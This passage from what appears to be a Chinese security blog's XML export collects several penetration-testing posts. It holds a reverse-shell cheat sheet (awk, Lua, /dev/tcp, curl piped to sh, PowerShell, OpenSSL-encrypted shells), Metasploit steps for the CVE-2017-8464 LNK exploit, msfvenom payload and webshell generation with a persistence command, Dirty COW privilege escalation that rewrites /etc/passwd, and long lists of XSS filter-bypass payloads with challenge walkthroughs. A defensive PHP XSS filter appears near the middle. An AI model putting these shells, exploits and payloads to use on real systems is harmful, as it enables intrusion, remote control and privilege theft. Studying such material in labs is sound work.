&quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;ip&apos;,&apos;port&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot; 10.gawk1234567891011121314151617181920#!/usr/bin/gawk -fBEGIN &#123; Port = 8080 Prompt = &quot;bkd&gt; &quot; Service = &quot;/inet/tcp/&quot; Port &quot;/0/0&quot; while (1) &#123; do &#123; printf Prompt |&amp; Service Service |&amp; getline cmd if (cmd) &#123; while ((cmd |&amp; getline) &gt; 0) print $0 |&amp; Service close(cmd) &#125; &#125; while (cmd != &quot;exit&quot;) close(Service) &#125;&#125; 11、awk1awk &apos;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.1.128/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&apos; 12、其他0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/ip/port;sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 curl https://x.x.sh/ip:port | sh powershell -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&#39;1.1.1.1&#39;,6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.UTF8Encoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::UTF8).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot; nc 无法接收到shell可尝试使用ncat接收 使用Openssl加密反弹shell流量：1、在vps上生成SSL证书的公钥/私钥对openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes2、openssl s_server -quiet -key key.pem -cert cert.pem -port 81 3、在目标机器上用openssl反弹加密shellmkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.80.137:81 &gt; /tmp/s; rm /tmp/s 参考链接：http://www.freebuf.com/articles/system/147768.htmlhttps://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>nc</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LNK文件（快捷方式）远程代码执行漏洞（复现）]]></title>
    <url>%2F2017%2F08%2F29%2F17%2F</url>
    <content type="text"><![CDATA[介绍名称：CVE-2017-8464 LNK文件（快捷方式）远程代码执行漏洞 概要：攻击者可以通过可移动驱动器（U盘）或远程共享等方式将包含恶意LNK文件和与之相关的恶意二进制文件传播给用户。当用户通过Windows资源管理器或任何能够解析LNK文件的程序打开恶意的LNK文件时，与之关联的恶意二进制代码将在目标系统上执行。 复现：攻击机kali：192.168.86.180 靶机win10（64位）：192.168.86.177 首先kali下载exp：12cd /optWget https://raw.githubusercontent.com/ykoster/metasploit-framework/169e00bf3442447324df064192db62cdc5b5b860/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb copy exp到/usr/share/metasploit-framework/modules/exploit/windows/smb/目录下cp cve_2017_8464_lnk_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/ 生成监听shell 1234msf &gt; use exploit/multi/handler 使用exploit/multi/handler监听连入的backdoormsf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp 设置对应的payloadmsf exploit(handler) &gt; set LHOST 192.168.86.180msf exploit(handler) &gt; exploit -j 生成.LNK文件 1234use exploit/windows/smb/cve_2017_8464_lnk_rcemsf exploit(cve_2017_8464_lnk_rce) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpmsf exploit(cve_2017_8464_lnk_rce) &gt; set LHOST 192.168.86.180msf exploit(cve_2017_8464_lnk_rce) &gt; exploit 将生成的dll文件和以U盘盘符结尾的.LNK文件复制到U盘中；当插入U盘至主机，在靶机上双击.LNK文件，即可触发dll文件建立连接。 影响版本：桌面系统：Windows 10, 7, 8.1, 8, Vista和Windows RT 8.1服务器系统：Windows Server 2016，2012，2008 修复：桌面系统Windows 10,7,8.1和Windows RT 8.1；服务器系统：Windows Server 2016，2012，2008，可以通过Windows Update自动更新微软补丁的方式进行修复。Windows 8, Vista可以通过选择对应版本然后手动更新补丁的方式进行更新（补丁下载地址参考）https://support.microsoft.com/zh-cn/help/4025687/microsoft-security-advisory-4025685-guidance-for-older-platforms]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>CVE-2017-8464</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[msfvenom生成payload的方法]]></title>
    <url>%2F2017%2F08%2F29%2F16%2F</url>
    <content type="text"><![CDATA[二进制文件Windows msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT= Port -f exe &gt; shell.exe Linux msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= IP LPORT= Port -f elf &gt; shell.elf Mac msfvenom -p osx/x86/shell_reverse_tcp LHOST= IP LPORT= Port -f macho &gt; shell.macho webshellPHP msfvenom -p php/meterpreter_reverse_tcp LHOST= IP LPORT= Port -f raw &gt; shell.php ASP msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=Port -f asp &gt; shell.asp JSP msfvenom -p java/jsp_shell_reverse_tcp LHOST= IP LPORT= Port -f raw &gt; shell.jsp WAR msfvenom -p java/jsp_shell_reverse_tcp LHOST= IP LPORT=Port -f war &gt; shell.war 脚本shell（反弹shell）Python msfvenom -p cmd/unix/reverse_python LHOST= IP LPORT=Port -f raw &gt; shell.py Bash msfvenom -p cmd/unix/reverse_bash LHOST= IP LPORT=Port -f raw &gt; shell.sh Perl msfvenom -p cmd/unix/reverse_perl LHOST= IP LPORT=Port -f raw &gt; shell.pl 附：持续控制在攻击成功之后会反弹回一个会话，当木马被删除或不继续运行时，我们就无法再获得反弹的会话，那么想要进行一个持续的控制就需要在第一次获得会话时动一些手脚run persistence -U -i 5 –r ip port-U 用户登录时反弹会话 也可以使用-X当系统启动时反弹会话-i 时间]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>msfvenom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dirty COW的那些事]]></title>
    <url>%2F2017%2F08%2F28%2F15%2F</url>
    <content type="text"><![CDATA[本文又是一次笔记回顾，将doc的笔记用markdown写一遍，回顾一下23333333 简介漏洞编号：CVE-2016-5195 漏洞名称：脏牛（Dirty COW） 漏洞危害：低权限用户利用该漏洞技术可以在全版本 Linux 系统上实现本地提权 影响范围：Linux 内核2.6.22 &lt; 3.9 (x86/x64) 原理:Linux 内核的内存子系统在处理写入时复制（copy-on-write, COW）时产生了竞争条件（racecondition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。（A race condition was found in the way the Linux kernel’s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings.） 竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，可以获得 root 权限。***利用：exp 复现与总结在本地部署一个漏洞环境，使用web服务器上的大马反弹 shell后利用dirty cow 进行提权 反弹shell：12nc -l -p 22222 -vv bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 查看版本：cat /proc/version、uname -a、lsb release -a均可 编译：gcc -pthread exp.c -o exp -lcrypt 执行./exp 即可为用户firefart 设置密码 然后即可用添加的用户连接主机 除此之外，还可以用下面一些方式进行提权（学习自互联网）1)在/tmp/.pwn写入 123#!/bin/bashecho MOOOOOOOOOOO/bin/bash chmod+x/tmp/.pwn然后修改/etc/passwd中的shell指向./dirtyc0w /etc/passwd root:x:0:0:root:/root:/tmp/.pwn 2)添加用户到sudo组 ./dirtyc0w /etc/group &quot;$(sed&#39;s/\(sudo:x:.*:\)/\1test1/g&#39;/etc/group)&quot; 下次管理员再登陆的话 sudo su不需要密码 3)将/etc/passwd中的uid位改为0 4)注入shellcode到suid文件，比如最常见的2个文件/usr/bin/crontab/usr/bin/passwd 修复方案： Centos/RHEL更新 sudo yum update Ubuntu/Debian更新 sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade 更新到最新的内核版本即可。需要重启才能生效]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Linux提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我与XSS的感情之路(3)]]></title>
    <url>%2F2017%2F08%2F28%2F14%2F</url>
    <content type="text"><![CDATA[心得接着上一文过来，这一部分是个人的一些总结。对于挖掘xss漏洞，目的都是让自己的payload可以执行，在其探索的过程中，我个人首先会通过审查元素，了解其输入点，过滤规则，然后再针对性的进行payload的构造。首先，输入框、flash、css、上传点、http头部的字段、第三方插件、能主动修改其参数值的任意参数等等，存在输入的地方都有可能存在xss。明确好目标后，我习惯先输入一堆测试字符看看其过滤规则：&#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;{()}/&#39;script、on、alert、prompt、confirm、&lt;script src=&quot;http://x.js&quot;&gt; %c0u003cimg+src%3d1+onerror%3dalert(/xss/)+%c0u003e……一般都能判断出如何过滤的，就像之前做题的过程中，都是经过测试才有结果，才能对症下药。 然后对于过滤规则，我总结了这样几点： 1、大小写：&lt;ScRIpT&gt;alert(&#39;123&#39;)&lt;/sCRIpT&gt; 2、编码绕过：12345678.十六进制编码.jsfuck编码.url编码.unicode编码.加解密.HTML编码.hex编码.ASCII编码 3、绕过magic_quotes_gpc：&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt; 4、闭合标签&quot;&gt;&lt;script&gt;alert(/123/)&lt;/script&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; 5、标签绕过12345&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;&lt;button onclick=&quot;javascript:alert(&apos;xss&apos;)&gt;XSS&lt;/button&quot;&gt;&lt;title&gt;&lt;img a=&quot;&lt;/title&gt;&lt;img/src=1 onerror=alert(1)//&quot;&gt;&quot;onsubmit=javascript:alert(1)%20name=&quot;a&lt;svg/onload=prompt(1)&gt;等等 6、其他符号绕过 %0a alert(1); %0a 换行符 %0d /**/ 替换空格 %00 |截断 另外在某些情况下，当”被过滤，可以在IE内核下使用两个反引号(`)TAB键上面的那个代替双引号. 7、双字母绕过 &lt;img ononerrorerror=&quot;123&quot;&gt;、&lt;script&gt;alalertert(123)&lt;/script&gt;8、宽字节绕过gbxxxx系列的编码，那么我们尝试一下宽字节 %c0 %bf %5c 9、其他事件绕过（比如过滤了&lt;&gt;使用 &quot;onmouseover=alert(11) bad=）123456 onload onclick onerror prompt confirm onmousemove 附录1： type Horizontal Tab New line Carriage Return URL %09 %10 %13 空字符 (%00) 使得过滤器不能看到完整的 &lt;script&gt;标签. 只在 IE 6.0, IE 7.0 可以。 附录2： blank %20 / %2F —— —— ? %3F —— —— + %2B 防御：对于采用过滤、转义来防御xss漏洞最基本的方式，具体实现，必须基于代码，而对应的防御招式已经许多前辈们都有分享。我觉得做好编码、过滤的工作之后，下面两个措施也是有必要实施的。1：为Cookie加上HttpOnly标记。保护好cookie，就算各种过滤都被绕过，也无法读取、修改cookie，能有效的减轻危害。2：部署waf是一件很有效的工作。一个具有丰富规则库的waf能大幅度过滤掉恶意输入数据，个人感觉主要是能增加突破防御的难度，不仅仅针对于xss漏洞，其他的漏洞也是一样。能有效降低其风险。下面是一个php的xss过滤器：(学习于网上，将该代码加入到核心函数库，然后再调用即可) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?php function RemoveXSS($val) &#123; // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed // this prevents some character re-spacing such as &lt;java\0script&gt; // note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some inputs $val = preg_replace(&apos;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&apos;, &apos;&apos;, $val); // straight replacements, the user should never need these since they&apos;re normal characters // this prevents like &lt;IMG SRC=@avascript:alert(&apos;XSS&apos;)&gt; $search = &apos;abcdefghijklmnopqrstuvwxyz&apos;; $search .= &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;; $search .= &apos;1234567890!@#$%^&amp;*()&apos;; $search .= &apos;~`&quot;;:?+/=&#123;&#125;[]-_|\&apos;\\&apos;; for ($i = 0; $i &lt; strlen($search); $i++) &#123; // ;? matches the ;, which is optional // 0&#123;0,7&#125; matches any padded zeros, which are optional and go up to 8 chars // @ @ search for the hex values $val = preg_replace(&apos;/(&amp;#[xX]0&#123;0,8&#125;&apos;.dechex(ord($search[$i])).&apos;;?)/i&apos;, $search[$i], $val); // with a ; // @ @ 0&#123;0,7&#125; matches &apos;0&apos; zero to seven times $val = preg_replace(&apos;/(&amp;#0&#123;0,8&#125;&apos;.ord($search[$i]).&apos;;?)/&apos;, $search[$i], $val); // with a ; &#125; // now the only remaining whitespace attacks are \t, \n, and \r $ra1 = Array(&apos;javascript&apos;, &apos;vbscript&apos;, &apos;expression&apos;, &apos;applet&apos;, &apos;meta&apos;, &apos;xml&apos;, &apos;blink&apos;, &apos;link&apos;, &apos;style&apos;, &apos;script&apos;, &apos;embed&apos;, &apos;object&apos;, &apos;iframe&apos;, &apos;frame&apos;, &apos;frameset&apos;, &apos;ilayer&apos;, &apos;layer&apos;, &apos;bgsound&apos;, &apos;title&apos;, &apos;base&apos;); $ra2 = Array(&apos;onabort&apos;, &apos;onactivate&apos;, &apos;onafterprint&apos;, &apos;onafterupdate&apos;, &apos;onbeforeactivate&apos;, &apos;onbeforecopy&apos;, &apos;onbeforecut&apos;, &apos;onbeforedeactivate&apos;, &apos;onbeforeeditfocus&apos;, &apos;onbeforepaste&apos;, &apos;onbeforeprint&apos;, &apos;onbeforeunload&apos;, &apos;onbeforeupdate&apos;, &apos;onblur&apos;, &apos;onbounce&apos;, &apos;oncellchange&apos;, &apos;onchange&apos;, &apos;onclick&apos;, &apos;oncontextmenu&apos;, &apos;oncontrolselect&apos;, &apos;oncopy&apos;, &apos;oncut&apos;, &apos;ondataavailable&apos;, &apos;ondatasetchanged&apos;, &apos;ondatasetcomplete&apos;, &apos;ondblclick&apos;, &apos;ondeactivate&apos;, &apos;ondrag&apos;, &apos;ondragend&apos;, &apos;ondragenter&apos;, &apos;ondragleave&apos;, &apos;ondragover&apos;, &apos;ondragstart&apos;, &apos;ondrop&apos;, &apos;onerror&apos;, &apos;onerrorupdate&apos;, &apos;onfilterchange&apos;, &apos;onfinish&apos;, &apos;onfocus&apos;, &apos;onfocusin&apos;, &apos;onfocusout&apos;, &apos;onhelp&apos;, &apos;onkeydown&apos;, &apos;onkeypress&apos;, &apos;onkeyup&apos;, &apos;onlayoutcomplete&apos;, &apos;onload&apos;, &apos;onlosecapture&apos;, &apos;onmousedown&apos;, &apos;onmouseenter&apos;, &apos;onmouseleave&apos;, &apos;onmousemove&apos;, &apos;onmouseout&apos;, &apos;onmouseover&apos;, &apos;onmouseup&apos;, &apos;onmousewheel&apos;, &apos;onmove&apos;, &apos;onmoveend&apos;, &apos;onmovestart&apos;, &apos;onpaste&apos;, &apos;onpropertychange&apos;, &apos;onreadystatechange&apos;, &apos;onreset&apos;, &apos;onresize&apos;, &apos;onresizeend&apos;, &apos;onresizestart&apos;, &apos;onrowenter&apos;, &apos;onrowexit&apos;, &apos;onrowsdelete&apos;, &apos;onrowsinserted&apos;, &apos;onscroll&apos;, &apos;onselect&apos;, &apos;onselectionchange&apos;, &apos;onselectstart&apos;, &apos;onstart&apos;, &apos;onstop&apos;, &apos;onsubmit&apos;, &apos;onunload&apos;); $ra = array_merge($ra1, $ra2); $found = true; // keep replacing as long as the previous round replaced something while ($found == true) &#123; $val_before = $val; for ($i = 0; $i &lt; sizeof($ra); $i++) &#123; $pattern = &apos;/&apos;; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) &#123; if ($j &gt; 0) &#123; $pattern .= &apos;(&apos;; $pattern .= &apos;(&amp;#[xX]0&#123;0,8&#125;([9ab]);)&apos;; $pattern .= &apos;|&apos;; $pattern .= &apos;|(&amp;#0&#123;0,8&#125;([9|10|13]);)&apos;; $pattern .= &apos;)*&apos;; &#125; $pattern .= $ra[$i][$j]; &#125; $pattern .= &apos;/i&apos;; $replacement = substr($ra[$i], 0, 2).&apos;&lt;x&gt;&apos;.substr($ra[$i], 2); // add in &lt;&gt; to nerf the tag $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags if ($val_before == $val) &#123; // no replacements were made, so exit the loop $found = false; &#125; &#125; &#125; return $val; &#125; ?&gt; 参考链接：http://www.freebuf.com/sectool/108568.htmlhttps://www.secpulse.com/archives/44299.htmlhttps://www.waitalone.cn/the-seven-principles-of-xss-defense.html]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我与XSS的感情之路(2)]]></title>
    <url>%2F2017%2F07%2F23%2F13%2F</url>
    <content type="text"><![CDATA[接着上一文过来，这一部分是第二个环境的做题记录。 平台2 xsqler.winStage#1: http://sqler.win/xss/level1.php?name=test本关简单，使用svg\body\style \ iframe等标签均可过关。payload: http://sqler.win/xss/level1.php?name=test&lt;body/onload=alert(1)&gt; Stage#2: http://sqler.win/xss/level2.php?keyword=test本题与第一题差不多，只需要进行标签的闭合即可。payload:http://sqler.win/xss/level2.php?keyword=test&quot;&gt;&lt;body/onload=alert(1)&gt; Stage#3：http://sqler.win/xss/level3.php?writing=wait本题通过测试，可得知过滤了&lt;&gt;，且只能用’闭合标签。于是采用on事件型如onmouseover、onmouseout、onclick等进行绕过。Payload: &#39;onmouseover=&#39;alert(1) Stage#4: http://sqler.win/xss/level4.php?keyword=本题与上题类似，使用”闭合标签即可：payload：&quot;onmouseover=&#39;alert(1)’ Stage#5: http://sqler.win/xss/level5.php?keyword=find a way out! 本题比较简单，增加了过滤范围，on-&gt;o_n 然后需要闭合。可以使用&quot;&gt;&lt;a href=javascript:alert(1)&gt;通过点击出现的链接进行通关。 Stage#6: http://sqler.win/xss/level6.php?keyword=break it out! 随便哪一个试一下，处理掉了src、herf、onxxx、等，需要进行绕过，通过大小写，成功绕过payload：&quot;&gt;&lt;a HRef=javascript:alert(1)&gt; Stage#7: http://sqler.win/xss/level7.php?keyword=move up! 本题对输入的script、on等进行了单层过滤，可以使用其过滤不严，采用此类payload绕过即可：&lt;svg/oonnload=alert(1)&gt;、或者将script写成scrscriptipt的方式构造即可。 Stage#8:http://sqler.win/xss/level7.php?keyword=move up! 本题已经给出了一个标签,但是过滤了script、src等，大小写无法绕过，但是可以使用html编码进行绕过payload：javasc&amp;#114;ipt:alert(1) Stage#9：http://sqler.win/xss/level9.php?keyword=not bad! 本题最大的难点在于绕合法连接，发现只有带http://的url才能被认为是合法链接，另外由于“”也被过滤，其他规则与上一关相同，因此需要进行编码。于是构造payload： javascr&amp;#105pt:alert(&amp;#34;http://x&amp;#34;) Stage#10：http://sqler.win/xss/level10.php?keyword=well done! 本题存在三个隐藏输入框，构造如下get请求，查看元素后，发现t_sort能被写入，如图：get请求：http://sqler.win/xss/level10.php?t_link=111&amp;t_history=222&amp;t_sort=333 因此只需要在该参数处构造跨站脚本语句即可，使用&quot;onmouseover=&#39;alert(1)&#39;然后让输入框属性显示出来改hidden为text即可：payload如下：http://sqler.win/xss/level10.php?t_sort=&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39; Stage#11：http://sqler.win/xss/level11.php?keyword=good job! 通过查看元素，发现t_ref的value是我们这个网页的referer值，抓包修改referer输入xss payload：&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;即可，本题不想多说什么，感觉referer一般存在xss的极少。 Stage#12：http://sqler.win/xss/level12.php?keyword=good job! 查看元素可看到t_ua参数的value是User-Agent值，和上一题一样，修改为xss payload即可：&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39; Stage#13：http://sqler.win/xss/level13.php?keyword=good job! 此题思路同上，这次传参位置为cookie，payload：&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;；感觉这三题是绕脑洞的样子，，，但是在测试过程中还真没发现过，，，， Stage#14：http://sqler.win/xss/level14.php本题可以在查看元素发现嵌入了一个iframe页面，访问该页面是查看图片EXIF信息的，通过看答案知道有EXIF在解析过程中，某些插件在解析时输出未处理可导致xss漏洞，因此食用exiftool工具，修改图片EXIF后，进行上传，然后解析过程中弹窗。学习了，，，， Stage#15：http://sqler.win/xsschallenge/level15.php?src=1.jpg本关说是利用src可包含前面页面上的xss漏洞，然后进行弹窗，怎么尝试都没弹出来，，，表示无奈。。。。。 Stage#16：http://sqler.win/xss/level16.php?keyword=本题终于回到常规绕的思路上了，，经过尝试，可以判断过滤了空格，/等符号，然后尝试绕过，很多姿势都不行，包括编码，进制，截断等然后发现换行符可以绕过：%0a、%0d，因此，payload：http://sqler.win/xss/level16.php?keyword=&lt;svg%0aonload=alert(1)&gt; Stage#17：http://sqler.win/xss/level17.php?arg01=a&amp;arg02=b本题比较简单，在arg02参数值中写入事件型payload即可触发，payload:http://sqler.win/xss/level17.php? arg02=%20onmousedown=alert(1) Stage#18：ttp://sqler.win/xss/level18.php?arg01=a&amp;arg02=b本题与上一题相似，但是arg02无法构造出空格，也就没办法写入输出语句，然后试了试arg01，果然换汤不换药，直接写入payload：%20onmousedown=alert(1) Stage#19：http://sqler.win/xss/level19.php?arg01=a&amp;arrg02=b右键查看元素可以看到一个swf文件被调用，然后设想为flash xss，通过下载该文件，使用JPEXS进行分析，发现为actionscript 2.0，然后知道actionscript 2.0是有可以使用getURL来执行javascript下面以一个实例来剖析Flash XSS过程。有点拗口，，,然后对应本题，定位geturl函数： 可以看到在sIFR的内容中当getURL打开时，version是可以传入到loc4中的，因此定位contentIsLink函数：12345function contentIsLink() &#123; return this.content.indexOf(&quot;&lt;a &quot;) == 0 &amp;&amp; (this.content.indexOf(&quot;&lt;a &quot;) == this.content.lastIndexOf(&quot;&lt;a &quot;) &amp;&amp; this.content.indexOf(&quot;&lt;/a&gt;&quot;) == this.content.length - 4); &#125; 然后可以根据contentIsLink函数构造出payload:http://sqler.win/xss/level19.php?arg01=version&amp;arg02=%3Ca%20href=%22javascript:alert(1)%22%3E1%3C/a%3E Stage#20：http://sqler.win/xss/level20.php?arg01=a&amp;arg02=b本题个人感觉比上一题容易做出来，，下载swf文件使用JPEXS进行分析后可以发现是zeroclipboard.swf，然后百度一发，freebuf第一个，粘贴即可payload：http://sqler.win/xss/xsf04.swf?id=\%22))}catch(e){(alert)(/XSS/.source);}//&amp;width=500&amp;height=500]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我与XSS的感情之路(1)]]></title>
    <url>%2F2017%2F07%2F20%2F12%2F</url>
    <content type="text"><![CDATA[科普XSS漏洞是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。本文主要是通过几个在线练习平台，记录一下个人对于xss漏洞的一些思路和总结。 平台1 xss-quizStage#1: http://xss-quiz.int21h.jp/?sid=2a75ff06e0147586b7ceb0fe68ee443b86a6e7b9 使用正常xss payload弹出domain即可通过。payload如：&lt;img onerrer=&quot;alert(document.domain);&quot;src=&gt; &lt;script&gt;alert(document.domain);&lt;/script&gt; Stage#2: http://xss-quiz.int21h.jp/stage2.php?sid=34ccb7f2bee3d0be52bf33339d0240c96f1cb61d这一题关键在于语句需要闭合，当闭合语句后，均可触发。payload如：&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; &quot;onclick=alert(document.domain) value=&quot;asd Stage#3: http://xss-quiz.int21h.jp/stage-3.php?sid=f3a8820ead8d740c43effd6cdae1fa1b41d0f0f7该题在写入js语句后，对尖括号进行了转义 尝试绕过，没有实现，但是可以在p2参数的参数值处构造跨站语句，成功弹出domain Stage#4: http://xss-quiz.int21h.jp/stage4.php?sid=9b47b7196b1da242b0d9ce4099ed0f17858b56e0p1、p2均作过滤了，在p3处闭合语句即可弹出，可通过查看源码发现隐藏的输入框，修改hackme的那个type为text，即p3的输入点即可，payload：&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; Stage#5: http://xss-quiz.int21h.jp/stage5.php?sid=b4d8b0467f463e3059a6e739d37739b6a364027e长度限制，使用burp改包绕过即可。也可以更改如图所示长度进行绕过，payload：&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; Stage#6: http://xss-quiz.int21h.jp/stage6.php?sid=a9998f35ee37ef3664ab6c6fc2574f428231c725该题过滤了尖括号&lt;&gt;，尝试绕过，发现可用鼠标移动类进行绕过如：&quot;onmouseover=&quot;alert(document.domain);&quot; &quot;onmouseout=&quot;alert(document.domain);&quot; &quot;onclick=alert(document.domain)等 Stage#7: http://xss-quiz.int21h.jp/stage07.php?sid=deeba845f047ee9df2627ec269f20c955e2eb8b8通过测试，发现该题过滤了&lt;&gt;、”、&amp;等，而且输入空格后自动添加双引号，因此，可构造此类payload如: a onmouseover=alert(document.domain)实现弹窗。 Stage#8: http://xss-quiz.int21h.jp/stage008.php?sid=1f0696e59ff506dee925f3e6bd62e9f5103543aa此题采用javascript伪协议即可，比较简单。Payload：javascript:alert(document.domain); ***Stage#9: http://xss-quiz.int21h.jp/stage_09.php?sid=9fb2098e09f0cdf338e09149e6f1550706fc3934此题提示信息为UTF7,因此通过UTF-7转码即可，不用burp截包，需要更改charset类型为text，并更改其value为UTF-7,然后即可弹窗payload：+ACIAIABvAG4AbQBvAHUAcwBlAG0AbwB2AGUAPQAiAGEAbABlAHIAdAAoAGQAbwBjAHUAbQBlAG4AdAAuAGQAbwBtAGEAaQBuACk- Stage#10: http://xss-quiz.int21h.jp/stage00010.php?sid=582038d983e1b7cff0888412ffa49b8ae03ecf38通过提示可看到domain被过滤了，可使用dodomainmain嵌套的方式进行绕过，因此，payload为：&quot;onmouseover=&quot;alert(document.domdomainain);// Stage#11: http://xss-quiz.int21h.jp/stage11th.php?sid=57ea445522e17a40142908ada7bd665857c358d9可以从提示中看到过滤规则如下：”s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;”，因此可以通过进行编码的方式构造xss语句。注意闭合前后。即可弹窗，payload：&quot;&gt;&lt;a href=javascr&amp;#105;pt:alert(document.domain)&gt;xss&lt;/a&gt; Stage#12: http://xss-quiz.int21h.jp/stage_no012.php?sid=7fc1df5b4cd62ce2afaaa11268a5039d3a67632a此题过滤规则如下：”s/[\x00-\x20\&lt;>\”\’]//g;”，过滤很严，从x00-x20,&lt;&gt;,”’都被过滤，于是用什么闭合是此题的关键，在IE8下可以通过进行闭合因此，可以构造payload： ` onmouseover=alert(document.domain); Stage#13: http://xss-quiz.int21h.jp/stage13_0.php?sid=eb77af0358676519402c3be00df480f638b168b7此题说是再CSS中用expression来实现js中的on事件，进而执行xss语句，再ie下可以利用，payload如下：xx:expression(onmouseover=function(){alert(document.domain)}) Stage#14: http://xss-quiz.int21h.jp/stage-_-14.php?sid=91443a5a0cc083c52ce78d11b5bf1beb238cb93b此题与上一题相似，但是做了过滤：s/(url|script|eval|expression)/xxx/ig;过滤url，eval，script，expression因此，需要尝试绕过过滤，经过尝试，可以利用注释符/**/、\、\0、编码等方式绕过。Payload如：xx:expre/**/ssion(onmouseover=function(){alert(document.domain)}) Stage#15：http://xss-quiz.int21h.jp/stage__15.php?sid=26ac2a0522c04a788c217fd8d7847aab1626f726本题经过测试将&lt;&gt;进行了转义，并且过滤了\，无法使用事件类型构造语句实现弹窗。因此考虑绕过其过滤规则，经过测试，可以使用编码进行绕过将&lt;&gt;进行16进制编码或者unicode编码即可。Payload:\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e Stage#16：http://xss-quiz.int21h.jp/stage00000016.php?sid=b3c99680d88d8f9002dce8b26f167c9c0a3a73a9此题与上一题相似，多一部分过滤：”s/\x/\\x/ig;”，因此无法使用16进制来绕过&lt;&gt;的过滤，用unicode编码同样可以绕过，也可以使用10进制绕过。Payload: \\74script\\76alert(document.domain);\\74/script\\76 Stage#17、Stage#18因为版本问题，过不去23333333。]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web源码泄露总结]]></title>
    <url>%2F2017%2F04%2F28%2F11%2F</url>
